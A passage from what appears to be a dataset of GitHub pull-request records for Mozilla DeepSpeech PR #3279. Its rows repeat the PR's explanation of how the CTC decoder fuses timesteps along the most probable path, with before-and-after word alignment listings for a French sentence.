 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,59c73f1c469b6017f3ee8c8f0802353e7bab0108,PR #3279 - assert instead of reporting error to std::cerr
558,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9466160c7e862b0e1eacf3c7574702c73b023d1,PR #3279 - revert to non RVO code
559,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,363121235e50e3ccd429996e09b6280df0cb8507,PR #3279 - revert to non RVO code (fix)
560,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
